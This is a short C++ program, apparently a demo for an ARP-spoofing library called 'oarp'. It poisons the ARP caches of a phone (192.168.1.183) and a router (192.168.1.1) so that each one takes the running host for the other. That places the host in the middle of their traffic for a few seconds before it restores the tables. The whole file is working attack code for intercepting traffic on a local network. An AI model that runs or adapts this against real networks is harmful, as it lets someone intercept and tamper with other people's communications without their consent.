/**
 *  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *  Version 2, December 2004
 *
 *  Copyright (C) 2017 Marcus Zhou <other.marcus@icloud.com>
 *
 *  You must agree to the license before using.
 *  See LICENSE file in this folder for more information
 */

#include <iostream>
#include "oarp.h"

int main() {
    auto host = std::make_shared<oarp>();
    auto phone = host
            ->addTarget("192.168.1.183")
            ->spoofAs("192.168.1.1")
            ->disguiseAsHost()
            ->resume();
    auto router = host
            ->addTarget("192.168.1.1")
            ->spoofAs("192.168.1.183")
            ->disguiseAsHost()
            ->resume();

    fprintf(stdout, "[*] Starting...\n");

    host->start();

    sleep(5);

    fprintf(stdout, "[*] Restoring...\n");

    phone->restore();
    router->restore();

    sleep(3);

    fprintf(stdout, "[*] Cleaning...\n");

    host->destory();

    return 0;
}
